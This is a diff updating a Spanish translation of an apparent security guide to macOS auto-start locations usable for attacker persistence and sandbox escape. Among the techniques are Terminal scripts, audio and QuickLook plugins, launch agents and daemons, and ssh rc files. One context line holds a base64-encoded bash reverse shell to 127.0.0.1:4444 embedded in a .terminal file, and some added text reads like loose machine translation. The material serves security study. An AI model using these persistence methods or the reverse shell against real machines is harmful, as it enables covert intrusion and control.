@@ -119,7 +119,7 @@ Descripción (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https:
 * `/etc/profile` (no funcionó)
 * `~/.profile` (no funcionó)
 * `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
-* **Disparador**: Se espera que se active con xterm, pero **no está instalado** e incluso después de instalarlo se produce este error: xterm: `DISPLAY is not set`
+* **Disparador**: Se espera que se active con xterm, pero **no está instalado** y incluso después de instalarlo se produce este error: xterm: `DISPLAY is not set`
 
 #### Descripción y explotación
 
@@ -217,7 +217,7 @@ Puedes agregar esto desde la línea de comandos con:
 ```
 {% endcode %}
 
-### Scripts de Terminal
+### Scripts de Terminal / Otras extensiones de archivo
 
 * Útil para evadir el sandbox: [✅](https://emojipedia.org/check-mark-button)
 
@@ -258,14 +258,16 @@ open /tmp/test.terminal
 # Use something like the following for a reverse shell:
 <string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
 ```
+También puedes usar las extensiones **`.command`** y **`.tool`**, con contenido de scripts de shell regulares, y también se abrirán en Terminal.
+
 {% hint style="danger" %}
-Si la terminal tiene **Acceso completo al disco**, podrá completar esa acción (ten en cuenta que el comando ejecutado será visible en una ventana de terminal).
+Si Terminal tiene **Acceso completo al disco**, podrá completar esa acción (ten en cuenta que el comando ejecutado será visible en una ventana de Terminal).
 {% endhint %}
 
 ### Plugins de audio
 
-Descripción: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
-Descripción: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
+Artículo: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
+Artículo: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
 
 #### Ubicación
 
@@ -283,11 +285,11 @@ Descripción: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](htt
 
 #### Descripción
 
-Según las descripciones anteriores, es posible **compilar algunos plugins de audio** y cargarlos.&#x20;
+Según los artículos anteriores, es posible **compilar algunos plugins de audio** y cargarlos.
 
 ### Plugins de QuickLook
 
-Descripción: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)
+Artículo: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)
 
 * Útil para evadir el sandbox: [✅](https://emojipedia.org/check-mark-button)
 
@@ -311,7 +313,7 @@ Es posible compilar tu propio plugin de QuickLook, colocarlo en una de las ubica
 Esto no funcionó para mí, ni con el LoginHook de usuario ni con el LogoutHook de root.
 {% endhint %}
 
-**Descripción**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)
+**Artículo**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)
 
 Útil para evadir el sandbox: [✅](https://emojipedia.org/check-mark-button)
 
@@ -427,21 +429,21 @@ La carpeta de inicio personal del usuario es una ubicación común para agregar 
 
 ## Carpeta de inicio global
 
-La carpeta de inicio global es una ubicación donde se pueden agregar elementos de inicio automático para todos los usuarios del sistema. Puede acceder a esta carpeta navegando a `/Library/LaunchAgents`. Al igual que en la carpeta de inicio personal, aquí encontrará archivos `.plist` que especifican las aplicaciones y scripts que se iniciarán automáticamente.
+La carpeta de inicio global es una ubicación donde se pueden agregar elementos de inicio automático para todos los usuarios del sistema. Puede acceder a esta carpeta navegando a `/Library/LaunchAgents`. Al igual que la carpeta de inicio personal, esta carpeta contiene archivos `.plist` que especifican qué aplicaciones y scripts se iniciarán automáticamente.
 
 ## Carpetas de inicio del sistema
 
-Además de las carpetas de inicio personal y global, también hay carpetas de inicio del sistema que contienen elementos de inicio automático. Estas carpetas se encuentran en `/Library/LaunchDaemons` y `/System/Library/LaunchDaemons`. Los archivos `.plist` en estas carpetas especifican los servicios y demonios del sistema que se iniciarán automáticamente.
+Además de las carpetas de inicio personal y global, macOS también tiene carpetas de inicio del sistema que contienen elementos de inicio automático. Estas carpetas se encuentran en `/Library/LaunchDaemons` y `/System/Library/LaunchDaemons`. Los archivos `.plist` en estas carpetas especifican qué servicios y demonios se iniciarán automáticamente al arrancar el sistema.
 
 ## Preferencias del sistema
 
-Las Preferencias del sistema también ofrecen una forma de configurar elementos de inicio automático en macOS. Puede acceder a esta configuración yendo a `Preferencias del sistema -> Usuarios y grupos -> Elementos de inicio`. Aquí, puede agregar o eliminar elementos de inicio automático utilizando la interfaz gráfica de usuario.
+Las Preferencias del sistema también ofrecen una forma de configurar elementos de inicio automático en macOS. Puede acceder a esta configuración yendo a `Preferencias del sistema -> Usuarios y grupos -> Elementos de inicio`. Aquí, puede agregar o eliminar aplicaciones y scripts para que se inicien automáticamente al iniciar sesión.
 
 ## Programación de tareas
 
-Además de las ubicaciones anteriores, también puede utilizar la programación de tareas para configurar elementos de inicio automático en macOS. Puede utilizar la utilidad `cron` o `launchd` para programar la ejecución de scripts o comandos en momentos específicos.
+Además de las ubicaciones anteriores, macOS también tiene una utilidad de línea de comandos llamada `launchctl` que permite programar tareas para que se ejecuten automáticamente en momentos específicos. Puede usar `launchctl` para agregar, modificar o eliminar tareas programadas.
 
-Es importante tener en cuenta que, si bien estas ubicaciones son útiles para configurar el inicio automático de aplicaciones y scripts, también pueden ser utilizadas por malware o software malicioso para iniciar procesos no deseados. Por lo tanto, es importante revisar regularmente estas ubicaciones y eliminar cualquier elemento no deseado o desconocido.
+Es importante tener en cuenta que, si bien estas ubicaciones de inicio automático son útiles para los usuarios, también pueden ser aprovechadas por los atacantes para ejecutar malware o scripts maliciosos. Por lo tanto, es importante revisar regularmente estas ubicaciones y eliminar cualquier elemento no deseado o sospechoso.
 ```bash
 cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
 #!/usr/bin/env python3
@@ -535,15 +537,15 @@ EOF
 Descripción: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)
 
 * Útil para evadir el sandbox: [✅](https://emojipedia.org/check-mark-button)
-* Pero se necesita tener habilitado y usar SSH
+* Pero se necesita tener habilitado y usar ssh
 
 #### Ubicación
 
 * **`~/.ssh/rc`**
-* **Disparador**: Inicio de sesión a través de SSH
+* **Disparador**: Inicio de sesión a través de ssh
 * **`/etc/ssh/sshrc`**
 * Se requieren privilegios de root
-* **Disparador**: Inicio de sesión a través de SSH
+* **Disparador**: Inicio de sesión a través de ssh
 
 #### Descripción y Explotación
 
@@ -1448,7 +1450,7 @@ Después de colocar un nuevo directorio en una de estas dos ubicaciones, se debe
 </dict>
 </plist>
 ```
-{% tab title="superservicename" %}
+{% tab title="superservicename" %}Nombre del servicio súper
 ```bash
 #!/bin/sh
 . /etc/rc.common
